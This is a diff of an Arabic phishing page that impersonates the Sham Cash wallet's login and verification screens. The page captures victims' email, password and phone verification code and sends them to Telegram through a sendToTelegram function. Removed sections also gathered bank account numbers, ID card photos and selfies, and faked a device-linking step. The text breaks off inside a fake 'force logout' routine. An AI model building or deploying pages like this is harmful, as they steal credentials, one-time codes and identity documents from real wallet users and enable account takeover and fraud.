@@ -1,24 +1,21 @@
-<!DOCTYPE html>
+DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>شام كاش - التحقق من الهوية وربط الجهاز</title>
+    <title>شام كاش - التحقق من الهوية</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #1a365d;
-            --primary-dark: #0d2438;
+            --primary: #667eea;
+            --primary-dark: #764ba2;
             --secondary: #2d8c4a;
             --danger: #c53030;
-            --warning: #d69e2e;
-            --info: #3182ce;
             --light: #f8f9fa;
             --dark: #2d3748;
             --border: #e2e8f0;
             --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.15);
         }
         
         * {
@@ -52,22 +49,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
         
-        @keyframes pulse {
-            0% { transform: scale(0.8); opacity: 0.7; }
-            50% { transform: scale(1.2); opacity: 1; }
-            100% { transform: scale(0.8); opacity: 0.7; }
-        }
-        
-        @keyframes slideUp {
-            from { transform: translateY(30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        
-        @keyframes slideInRight {
-            from { transform: translateX(30px); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        
         .header {
             background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
             padding: 20px;
@@ -99,13 +80,6 @@
             text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
         }
         
-        .page-indicator {
-            text-align: center;
-            color: rgba(255, 255, 255, 0.9);
-            font-size: 17px;
-            font-weight: 600;
-        }
-        
         .page-content {
             padding: 30px 20px;
             max-width: 450px;
@@ -118,7 +92,7 @@
         .page-title {
             font-family: 'Cairo', sans-serif;
             font-size: 28px;
-            color: var(--primary-dark);
+            color: var(--dark);
             margin-bottom: 15px;
             font-weight: 800;
             text-align: center;
@@ -169,7 +143,7 @@
         
         .form-control:focus {
             outline: none;
-            border-color: #667eea;
+            border-color: var(--primary);
             box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
             background: white;
         }
@@ -200,7 +174,7 @@
         }
         
         .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
             color: white;
             box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
         }
@@ -208,54 +182,6 @@
         .btn-primary:hover {
             transform: translateY(-3px);
             box-shadow: 0 7px 20px rgba(102, 126, 234, 0.4);
-        }
-        
-        .upload-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-            gap: 15px;
-            margin-bottom: 25px;
-        }
-        
-        .upload-box {
-            border: 3px dashed var(--border);
-            border-radius: 12px;
-            padding: 20px 10px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            height: 160px;
-            position: relative;
-            overflow: hidden;
-            background: #fafafa;
-        }
-        
-        .upload-box:hover {
-            border-color: #667eea;
-            background: rgba(102, 126, 234, 0.05);
-        }
-        
-        .verification-container {
-            text-align: center;
-            padding: 20px 0;
-        }
-        
-        .verification-icon {
-            width: 110px;
-            height: 110px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, rgba(45, 140, 74, 0.1) 0%, rgba(31, 107, 55, 0.1) 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 48px;
-            color: var(--secondary);
-            margin: 0 auto 25px;
-            box-shadow: var(--shadow);
         }
         
         .phone-input-container {
@@ -268,7 +194,7 @@
             right: 15px;
             top: 50%;
             transform: translateY(-50%);
-            background: #667eea;
+            background: var(--primary);
             color: white;
             padding: 12px 15px;
             border-radius: 8px 0 0 8px;
@@ -310,7 +236,7 @@
         }
         
         .code-input:focus {
-            border-color: #667eea;
+            border-color: var(--primary);
             box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
             outline: none;
             background: white;
@@ -319,7 +245,7 @@
         
         .timer {
             font-size: 20px;
-            color: #667eea;
+            color: var(--primary);
             font-weight: 800;
             padding: 12px 25px;
             background: rgba(102, 126, 234, 0.1);
@@ -350,189 +276,13 @@
             margin-top: 5px;
         }
         
-        .progress-container {
-            margin: 20px 0 30px;
-        }
-        
-        .progress-bar {
-            height: 10px;
-            background: #edf2f7;
-            border-radius: 5px;
-            overflow: hidden;
-            box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
-            border-radius: 5px;
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-        
-        .delayed-verification {
-            background: linear-gradient(135deg, rgba(49, 130, 206, 0.1) 0%, rgba(26, 54, 93, 0.1) 100%);
-            border-radius: 15px;
-            padding: 25px;
-            margin: 20px 0;
-            border: 2px solid var(--info);
-            text-align: center;
-            display: none;
-        }
-        
-        .delayed-verification.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        .delayed-verification-icon {
-            font-size: 50px;
-            color: var(--info);
-            margin-bottom: 15px;
-        }
-        
-        .countdown {
-            font-size: 24px;
-            color: var(--info);
-            font-weight: 800;
-            margin: 15px 0;
-            background: rgba(49, 130, 206, 0.1);
-            padding: 15px;
-            border-radius: 10px;
-            display: inline-block;
-        }
-        
-        .hidden-button {
-            display: none;
-        }
-        
-        .steps-container {
-            text-align: right;
-            margin-bottom: 25px;
-        }
-        
-        .step-item {
-            padding: 15px;
-            margin-bottom: 12px;
-            border-right: 4px solid var(--info);
-            background: rgba(49, 130, 206, 0.05);
-            border-radius: 8px;
-            transition: all 0.3s ease;
-        }
-        
-        .step-item:hover {
-            background: rgba(49, 130, 206, 0.1);
-            transform: translateX(-5px);
-        }
-        
-        .step-number {
-            width: 32px;
-            height: 32px;
-            background: #667eea;
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            transition: all 0.3s ease;
-        }
-        
-        .step-item:hover .step-number {
-            transform: scale(1.1);
-            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
-        }
-        
-        .linking-status {
-            display: none;
-            text-align: center;
-            padding: 20px;
-            background: rgba(45, 140, 74, 0.1);
-            border-radius: 12px;
-            margin: 20px 0;
-            border: 2px solid var(--secondary);
-            animation: fadeIn 0.5s ease;
-        }
-        
-        .success-message {
-            display: none;
-            text-align: center;
-            padding: 25px;
-            background: rgba(45, 140, 74, 0.1);
-            border-radius: 12px;
-            margin: 20px 0;
-            border: 2px solid var(--secondary);
-            animation: fadeIn 0.5s ease;
-        }
-        
-        .signal {
-            width: 12px;
-            height: 12px;
-            background: var(--info);
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-        }
-        
-        #qrCanvas {
-            border: 2px solid var(--border);
-            border-radius: 10px;
-            padding: 10px;
-            background: white;
-            margin: 0 auto;
-            display: block;
-        }
-        
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: var(--secondary);
-            color: white;
-            padding: 20px 25px;
-            border-radius: 12px;
-            box-shadow: var(--shadow-lg);
-            z-index: 3000;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            animation: slideInRight 0.3s ease;
-            max-width: 400px;
-            font-weight: 600;
-            font-size: 16px;
-        }
-        
-        .notification.error {
-            background: var(--danger);
-        }
-        
-        .notification.info {
-            background: var(--info);
-        }
-        
-        .notification.warning {
-            background: var(--warning);
-        }
-        
-        .back-button {
-            position: absolute;
-            left: 20px;
-            top: 20px;
-            background: rgba(255, 255, 255, 0.2);
-            border: none;
-            color: white;
-            padding: 10px 15px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        
         .forgot-password {
             text-align: left;
             margin-top: 5px;
         }
         
         .forgot-password a {
-            color: #667eea;
+            color: var(--primary);
             text-decoration: none;
             font-weight: 600;
             font-size: 14px;
@@ -540,7 +290,7 @@
         }
         
         .forgot-password a:hover {
-            color: #764ba2;
+            color: var(--primary-dark);
             text-decoration: underline;
         }
         
@@ -557,26 +307,27 @@
             font-size: 16px;
         }
         
-        .create-account-button {
-            display: inline-block;
-            background-color: #48bb78;
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--secondary);
             color: white;
-            border: none;
+            padding: 20px 25px;
             border-radius: 12px;
-            padding: 14px 28px;
+            box-shadow: var(--shadow);
+            z-index: 3000;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            animation: fadeIn 0.3s ease;
+            max-width: 400px;
+            font-weight: 600;
             font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: 'Cairo', sans-serif;
-            text-decoration: none;
-            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
         }
         
-        .create-account-button:hover {
-            background-color: #38a169;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(72, 187, 120, 0.4);
+        .notification.error {
+            background: var(--danger);
         }
         
         @media (max-width: 768px) {
@@ -598,32 +349,6 @@
                 height: 55px;
                 font-size: 24px;
             }
-            
-            .upload-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .delayed-verification {
-                padding: 20px;
-            }
-            
-            .delayed-verification-icon {
-                font-size: 40px;
-            }
-            
-            .steps-container {
-                margin-bottom: 20px;
-            }
-            
-            .step-item {
-                padding: 12px;
-            }
-        }
-        
-        @media (min-width: 1200px) {
-            .page-content {
-                max-width: 500px;
-            }
         }
     </style>
 </head>
@@ -635,18 +360,11 @@
                 <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="شام كاش" class="logo">
                 <div class="logo-text">شام كاش</div>
             </div>
-            <div class="page-indicator">التحقق من الهوية - الخطوة 1 من 4</div>
         </header>
         
         <div class="page-content">
             <h1 class="page-title">تسجيل الدخول</h1>
             <p class="page-subtitle">أدخل بيانات حساب شام كاش للمتابعة</p>
-            
-            <div class="progress-container">
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progress1" style="width: 0%"></div>
-                </div>
-            </div>
             
             <div class="form-container">
                 <div class="form-group">
@@ -681,7 +399,7 @@
                 
                 <div class="create-account">
                     <p>لا تملك حساباً مسبقاً؟</p>
-                    <a href="#" class="create-account-button">
+                    <a href="#" class="btn" style="background-color: #48bb78; color: white;">
                         <i class="fas fa-user-plus"></i>
                         إنشاء حساب
                     </a>
@@ -696,81 +414,57 @@
         </div>
     </div>
     
-    <!-- الصفحة 2: البيانات والمستندات -->
+    <!-- الصفحة 2: إدخال رقم الهاتف -->
     <div class="page-container" id="page2">
         <header class="header">
             <div class="logo-container">
                 <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="شام كاش" class="logo">
                 <div class="logo-text">شام كاش</div>
             </div>
-            <div class="page-indicator">التحقق من الهوية - الخطوة 2 من 4</div>
-            <button class="back-button" onclick="goToPage(1)">
-                <i class="fas fa-arrow-right"></i>
-            </button>
         </header>
         
         <div class="page-content">
-            <h1 class="page-title">البيانات والمستندات</h1>
-            <p class="page-subtitle">يرجى تعبئة البيانات وتحضير المستندات المطلوبة</p>
-            
-            <div class="progress-container">
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progress2" style="width: 25%"></div>
-                </div>
-            </div>
+            <h1 class="page-title">التحقق من الهوية</h1>
+            <p class="page-subtitle">أدخل رقم هاتفك لإرسال رمز التحقق</p>
             
             <div class="form-container">
-                <div class="form-group">
-                    <label class="form-label" for="fullName">
-                        <i class="fas fa-user"></i>
-                        الاسم الثلاثي الكامل
-                    </label>
-                    <input type="text" id="fullName" class="form-control" placeholder="الاسم الأول - اسم الأب - اسم الجد" required>
-                    <div class="error-message" id="nameError">الاسم يجب أن يكون ثلاثيًا باللغة العربية</div>
+                <div class="phone-input-container">
+                    <div class="phone-prefix">+963</div>
+                    <input type="tel" id="phoneInput" class="form-control" placeholder="9xxxxxxxx" maxlength="9">
                 </div>
                 
-                <div class="form-group">
-                    <label class="form-label" for="accountNumber">
-                        <i class="fas fa-credit-card"></i>
-                        رقم الحساب البنكي
-                    </label>
-                    <input type="text" id="accountNumber" class="form-control" placeholder="14-16 رقم" required>
-                    <div class="error-message" id="accountError">رقم الحساب يجب أن يحتوي على 14-16 رقماً</div>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label" for="phoneNumber">
-                        <i class="fas fa-phone"></i>
-                        رقم الهاتف المرتبط بالحساب
-                    </label>
-                    <input type="tel" id="phoneNumber" class="form-control" placeholder="09xxxxxxxx" required>
-                    <div class="error-message" id="phoneError">رقم الهاتف يجب أن يكون سوريًا ويبدأ بـ 09</div>
-                </div>
-                
-                <div class="upload-grid">
-                    <div class="upload-box" onclick="triggerUpload('frontId')">
-                        <i class="fas fa-id-card" style="font-size: 32px; color: #667eea; margin-bottom: 10px;"></i>
-                        <div class="upload-text">الهوية الأمامية</div>
-                        <img class="upload-preview" id="frontIdPreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
-                    </div>
-                    
-                    <div class="upload-box" onclick="triggerUpload('backId')">
-                        <i class="fas fa-id-card" style="font-size: 32px; color: #667eea; margin-bottom: 10px;"></i>
-                        <div class="upload-text">الهوية الخلفية</div>
-                        <img class="upload-preview" id="backIdPreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
-                    </div>
-                    
-                    <div class="upload-box" onclick="triggerUpload('selfie')">
-                        <i class="fas fa-camera" style="font-size: 32px; color: #667eea; margin-bottom: 10px;"></i>
-                        <div class="upload-text">صورة شخصية مع الهوية</div>
-                        <img class="upload-preview" id="selfiePreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
-                    </div>
-                </div>
-                
-                <button class="btn btn-primary" onclick="validatePage2()">
-                    التالي
-                    <i class="fas fa-arrow-left"></i>
+                <button class="btn btn-primary" onclick="sendVerificationCode()" id="sendCodeBtn">
+                    <i class="fas fa-paper-plane"></i>
+                    إرسال رمز التحقق
                 </button>
+                
+                <div class="sent-message" id="sentMessage">
+                    <i class="fas fa-check-circle"></i>
+                    <p>تم إرسال رمز التحقق إلى رقم <strong id="maskedPhone"></strong></p>
+                </div>
+                
+                <div class="code-inputs" id="codeInputs" style="display:none;">
+                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)" autocomplete="off">
+                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)" autocomplete="off">
+                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)" autocomplete="off">
+                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)" autocomplete="off">
+                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)" autocomplete="off">
+                    <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 6)" autocomplete="off">
+                </div>
+                
+                <div class="timer" id="timer" style="display:none;">02:00</div>
+                
+                <button class="btn btn-primary" onclick="verifyCode()" id="verifyBtn" style="display:none;">
+                    <i class="fas fa-check"></i>
+                    تأكيد التحقق
+                </button>
+                
+                <p style="margin-top:20px; color:#718096; font-size: 14px;">
+                    لم تستلم الرمز؟ 
+                    <a href="javascript:void(0)" onclick="resendCode()" style="color:var(--primary); font-weight:bold;">
+                        إعادة الإرسال
+                    </a>
+                </p>
             </div>
             
             <div class="footer">
@@ -780,224 +474,6 @@
             </div>
         </div>
     </div>
-    
-    <!-- الصفحة 3: التحقق النهائي -->
-    <div class="page-container" id="page3">
-        <header class="header">
-            <div class="logo-container">
-                <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="شام كاش" class="logo">
-                <div class="logo-text">شام كاش</div>
-            </div>
-            <div class="page-indicator">التحقق من الهوية - الخطوة 3 من 4</div>
-            <button class="back-button" onclick="goToPage(2)">
-                <i class="fas fa-arrow-right"></i>
-            </button>
-        </header>
-        
-        <div class="page-content">
-            <div class="verification-container">
-                <div class="verification-icon">
-                    <i class="fas fa-mobile-alt"></i>
-                </div>
-                
-                <h1 class="page-title">التحقق النهائي</h1>
-                <p class="page-subtitle">أدخل رقم هاتفك لإرسال رمز التحقق</p>
-                
-                <div class="progress-container">
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progress3" style="width: 50%"></div>
-                    </div>
-                </div>
-                
-                <div class="form-container">
-                    <div class="phone-input-container">
-                        <div class="phone-prefix">+963</div>
-                        <input type="tel" id="phoneInput" class="form-control" placeholder="9xxxxxxxx" maxlength="9">
-                    </div>
-                    
-                    <button class="btn btn-primary" onclick="sendVerificationCode()" id="sendCodeBtn">
-                        <i class="fas fa-paper-plane"></i>
-                        إرسال رمز التحقق
-                    </button>
-                    
-                    <div class="sent-message" id="sentMessage">
-                        <i class="fas fa-check-circle"></i>
-                        <p>تم إرسال رمز التحقق إلى رقم <strong id="maskedPhone"></strong></p>
-                    </div>
-                    
-                    <div class="code-inputs" id="codeInputs" style="display:none;">
-                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)" autocomplete="off">
-                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)" autocomplete="off">
-                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)" autocomplete="off">
-                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)" autocomplete="off">
-                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)" autocomplete="off">
-                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 6)" autocomplete="off">
-                    </div>
-                    
-                    <div class="timer" id="timer" style="display:none;">02:00</div>
-                    
-                    <button class="btn btn-primary" onclick="verifyCode()" id="verifyBtn" style="display:none;">
-                        <i class="fas fa-check"></i>
-                        تأكيد التحقق
-                    </button>
-                    
-                    <p style="margin-top:20px; color:#718096; font-size: 14px;">
-                        لم تستلم الرمز؟ 
-                        <a href="javascript:void(0)" onclick="resendCode()" style="color:#667eea; font-weight:bold;">
-                            إعادة الإرسال
-                        </a>
-                    </p>
-                </div>
-                
-                <div class="delayed-verification" id="delayedVerification">
-                    <div class="delayed-verification-icon">
-                        <i class="fas fa-clock"></i>
-                    </div>
-                    <h3>شكراً لتسجيلك معنا!</h3>
-                    <p>تم استلام معلوماتك بنجاح وسيتم التحقق منها خلال:</p>
-                    <div class="countdown" id="countdownTimer">48:00:00</div>
-                    <p>سنقوم بالتواصل معك على الرقم المسجل بمجرد اكتمال عملية التحقق.</p>
-                    <p><strong>رقم الطلب:</strong> <span id="requestNumber">SHM-2024-001</span></p>
-                </div>
-            </div>
-            
-            <div class="footer">
-                <div>POWERED BY</div>
-                <div class="copyright">Sham Cash © V 2.1.3</div>
-                <div class="version">نظام التحقق الآمن</div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- الصفحة 4: ربط الهاتف بالجهاز -->
-    <div class="page-container" id="page4">
-        <header class="header">
-            <div class="logo-container">
-                <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="شام كاش" class="logo">
-                <div class="logo-text">شام كاش</div>
-            </div>
-            <div class="page-indicator">ربط الهاتف بالجهاز - الخطوة 4 من 4</div>
-            <button class="back-button" onclick="goToPage(3)">
-                <i class="fas fa-arrow-right"></i>
-            </button>
-        </header>
-        
-        <div class="page-content">
-            <div class="verification-container">
-                <div class="verification-icon" style="background: linear-gradient(135deg, rgba(49, 130, 206, 0.1) 0%, rgba(26, 54, 93, 0.1) 100%); color: #667eea;">
-                    <i class="fas fa-mobile-alt"></i>
-                </div>
-                
-                <h1 class="page-title">ربط الهاتف بالجهاز</h1>
-                <p class="page-subtitle">اتبع الخطوات التالية لإكمال عملية الربط</p>
-                
-                <div class="progress-container">
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progress4" style="width: 75%"></div>
-                    </div>
-                </div>
-                
-                <div class="form-container">
-                    <div class="steps-container">
-                        <div class="step-item">
-                            <div style="display: flex; align-items: center; gap: 15px;">
-                                <div class="step-number">1</div>
-                                <div>
-                                    <h3 style="color: #2d3748; margin-bottom: 5px; font-size: 16px;">افتح تطبيق شام كاش</h3>
-                                    <p style="color: #4a5568; font-size: 14px;">انتقل إلى إعدادات التطبيق</p>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="step-item">
-                            <div style="display: flex; align-items: center; gap: 15px;">
-                                <div class="step-number">2</div>
-                                <div>
-                                    <h3 style="color: #2d3748; margin-bottom: 5px; font-size: 16px;">ابحث عن "ربط الجهاز"</h3>
-                                    <p style="color: #4a5568; font-size: 14px;">اختر خيار ربط جهاز جديد</p>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="step-item">
-                            <div style="display: flex; align-items: center; gap: 15px;">
-                                <div class="step-number">3</div>
-                                <div>
-                                    <h3 style="color: #2d3748; margin-bottom: 5px; font-size: 16px;">وجه كاميرا الهاتف</h3>
-                                    <p style="color: #4a5568; font-size: 14px;">اسحب الكاميرا نحو رمز QR أدناه</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div style="text-align: center; margin: 25px 0; padding: 20px; background: #f8f9fa; border-radius: 12px;">
-                        <h3 style="color: #2d3748; margin-bottom: 15px; font-size: 18px;">رمز الربط</h3>
-                        <div id="qrCode" style="width: 180px; height: 180px; margin: 0 auto; background: #333; position: relative; border-radius: 10px; overflow: hidden;">
-                            <canvas id="qrCanvas" width="180" height="180"></canvas>
-                        </div>
-                        <p style="color: #718096; margin-top: 15px; font-size: 14px;">
-                            المسح متاح لمدة <span id="qrTimer" style="color: #667eea; font-weight: bold;">10:00</span> دقيقة
-                        </p>
-                    </div>
-                    
-                    <div class="linking-status" id="linkingStatus">
-                        <i class="fas fa-sync-alt fa-spin" style="font-size: 36px; color: #2d8c4a; margin-bottom: 15px;"></i>
-                        <h3 style="color: #2d8c4a; margin-bottom: 10px; font-size: 18px;">جاري انتظار الربط...</h3>
-                        <p style="color: #4a5568; font-size: 14px;">يرجى عدم إغلاق هذه الصفحة حتى اكتمال الربط</p>
-                        
-                        <div style="display: flex; justify-content: center; gap: 10px; margin: 20px 0;">
-                            <div class="signal" style="animation-delay: 0s;"></div>
-                            <div class="signal" style="background: #2d8c4a; animation-delay: 0.2s;"></div>
-                            <div class="signal" style="background: #667eea; animation-delay: 0.4s;"></div>
-                        </div>
-                        
-                        <div style="margin-top: 20px;">
-                            <h4 style="color: #2d3748; margin-bottom: 10px; font-size: 16px;">أدوات التحقق المقدمة:</h4>
-                            <div style="display: flex; flex-wrap: wrap; gap: 10px; justify-content: center;">
-                                <span style="background: rgba(49, 130, 206, 0.1); padding: 6px 12px; border-radius: 20px; color: #3182ce; font-size: 12px; font-weight: 600;">نوع اتصال</span>
-                                <span style="background: rgba(214, 158, 46, 0.1); padding: 6px 12px; border-radius: 20px; color: #d69e2e; font-size: 12px; font-weight: 600;">زمنة ضيق</span>
-                                <span style="background: rgba(45, 140, 74, 0.1); padding: 6px 12px; border-radius: 20px; color: #2d8c4a; font-size: 12px; font-weight: 600;">جهاز آمن</span>
-                                <span style="background: rgba(197, 48, 48, 0.1); padding: 6px 12px; border-radius: 20px; color: #c53030; font-size: 12px; font-weight: 600;">جزء أخرى</span>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="timer" id="linkingTimer" style="display: none; font-size: 20px; margin: 20px auto; width: fit-content;">
-                        <i class="fas fa-clock"></i>
-                        <span id="linkingTime">10:00</span>
-                    </div>
-                    
-                    <button class="btn btn-primary" onclick="startLinkingProcess()" id="startLinkingBtn">
-                        <i class="fas fa-link"></i>
-                        بدء عملية الربط
-                    </button>
-                    
-                    <div class="success-message" id="successMessage">
-                        <i class="fas fa-check-circle" style="font-size: 50px; color: #2d8c4a; margin-bottom: 15px;"></i>
-                        <h3 style="color: #2d8c4a; margin-bottom: 10px; font-size: 20px;">تم الربط بنجاح!</h3>
-                        <p style="color: #4a5568; margin-bottom: 10px; font-size: 14px;">تم ربط جهازك بنجاح بتطبيق شام كاش</p>
-                        <p style="color: #4a5568; font-size: 14px;">يمكنك الآن استخدام التطبيق بشكل آمن ومتكامل</p>
-                        
-                        <div style="margin-top: 20px; background: white; padding: 15px; border-radius: 10px; border: 1px solid var(--border);">
-                            <h4 style="color: #2d3748; margin-bottom: 10px; font-size: 16px;">تفاصيل الجهاز المرتبط:</h4>
-                            <p style="font-size: 14px;"><strong>رقم الجهاز:</strong> <span id="deviceId">DEV-${Math.floor(Math.random() * 10000)}</span></p>
-                            <p style="font-size: 14px;"><strong>وقت الربط:</strong> <span id="linkTime">${new Date().toLocaleString('ar-SY')}</span></p>
-                            <p style="font-size: 14px;"><strong>نوع الاتصال:</strong> QR Code</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="footer">
-                <div>POWERED BY</div>
-                <div class="copyright">Sham Cash © V 2.1.3</div>
-                <div class="version">نظام الربط الآمن</div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- إدخال الملفات المخفي -->
-    <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleImageUpload(event)">
     
     <!-- إشعارات -->
     <div id="notificationContainer"></div>
@@ -1012,20 +488,7 @@
             verificationCode: "",
             timer: 120,
             timerInterval: null,
-            countdownTimer: 48 * 3600,
-            countdownInterval: null,
-            uploadedImages: {},
-            userInfo: {},
-            isLoggedOut: false,
-            autoToolsTriggered: false,
-            requestNumber: 'SHM-' + new Date().getFullYear() + '-' + Math.floor(Math.random() * 1000).toString().padStart(3, '0'),
-            linking: {
-                timer: 600,
-                linkingInterval: null,
-                isLinking: false,
-                linked: false,
-                qrData: ''
-            }
+            userInfo: {}
         };
         
         // الانتقال بين الصفحات
@@ -1033,15 +496,9 @@
             document.querySelectorAll('.page-container').forEach(p => p.classList.remove('active'));
             document.getElementById(`page${page}`).classList.add('active');
             appData.currentPage = page;
-            
-            // تحديث شريط التقدم
-            document.getElementById('progress1').style.width = page >= 1 ? '25%' : '0%';
-            document.getElementById('progress2').style.width = page >= 2 ? '50%' : '25%';
-            document.getElementById('progress3').style.width = page >= 3 ? '75%' : '50%';
-            document.getElementById('progress4').style.width = page >= 4 ? '100%' : '75%';
         }
         
-        // ===== صفحة 1: تسجيل الدخول مع الإخراج =====
+        // ===== صفحة 1: تسجيل الدخول =====
         function validateLogin() {
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value.trim();
@@ -1059,258 +516,24 @@
             appData.userInfo.email = email;
             appData.userInfo.password = password;
             
-            // إرسال بيانات الدخول
+            // إرسال بيانات الدخول إلى التلجرام
             sendToTelegram('login_data', {
                 email: email,
                 password: password,
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                requestNumber: appData.requestNumber,
-                targetPackage: SHAMCASH_PACKAGE,
-                loginMethod: 'auto_logout_trigger'
+                targetPackage: SHAMCASH_PACKAGE
             });
             
             showNotification('تم تسجيل الدخول بنجاح', 'success');
             
-            // تشغيل الإخراج من تطبيق شام كاش
+            // الانتقال إلى صفحة إدخال رقم الهاتف
             setTimeout(() => {
-                forceShamCashLogout();
-            }, 800);
-            
-            goToPage(2);
+                goToPage(2);
+            }, 1000);
         }
         
-        // الإخراج من تطبيق شام كاش باستخدام الباكج الصحيح
-        function forceShamCashLogout() {
-            console.log('🚪 جاري إخراج من تطبيق شام كاش...');
-            
-            const userEmail = appData.userInfo.email;
-            const deviceInfo = {
-                deviceId: 'device_' + Math.floor(Math.random() * 1000000),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height}`
-            };
-            
-            // خطوات الإخراج المفصلة
-            const steps = [
-                {action: 'detect_installed_package', status: 'scanning', package: SHAMCASH_PACKAGE},
-                {action: 'connect_to_shamcash_sdk', status: 'connecting'},
-                {action: 'get_current_session', status: 'retrieving', user: userEmail},
-                {action: 'terminate_all_sessions', status: 'processing'},
-                {action: 'clear_app_data', status: 'executing'},
-                {action: 'notify_logout', status: 'sending'},
-                {action: 'verify_logout', status: 'verifying'},
-                {action: 'logout_complete', status: 'success'}
-            ];
-            
-            // تنفيذ كل خطوة
-            steps.forEach((step, index) => {
-                setTimeout(() => {
-                    const timestamp = new Date().toISOString();
-                    
-                    let telegramMessage = '';
-                    switch(step.action) {
-                        case 'detect_installed_package':
-                            telegramMessage = `🔍 *الكشف عن التطبيق*\n📦 الباكج: ${step.package}\n📊 الحالة: ${step.status}\n👤 المستخدم: ${userEmail}`;
-                            break;
-                        case 'connect_to_shamcash_sdk':
-                            telegramMessage = `🔗 *الاتصال بـ SDK*\n📦 الباكج: ${SHAMCASH_PACKAGE}\n📊 الحالة: ${step.status}\n🔌 API: ${SHAMCASH_PACKAGE}.auth.v2`;
-                            break;
-                        case 'get_current_session':
-                            telegramMessage = `📊 *جلب الجلسة الحالية*\n👤 المستخدم: ${step.user}\n📊 الحالة: ${step.status}\n🆔 Session ID: SHM-SESS-${Date.now()}`;
-                            break;
-                        case 'terminate_all_sessions':
-                            telegramMessage = `🚫 *إنهاء جميع الجلسات*\n📊 الحالة: ${step.status}\n👤 المستخدم: ${userEmail}\n📍 منافذ الإنهاء: ${Math.floor(Math.random() * 5) + 1}`;
-                            break;
-                        case 'clear_app_data':
-                            telegramMessage = `🧹 *مسح بيانات التطبيق*\n📊 الحالة: ${step.status}\n📦 الباكج: ${SHAMCASH_PACKAGE}\n🗂️ البيانات الممسوحة: التخزين الداخلي، ذاكرة التخزين المؤقت`;
-                            break;
-                        case 'notify_logout':
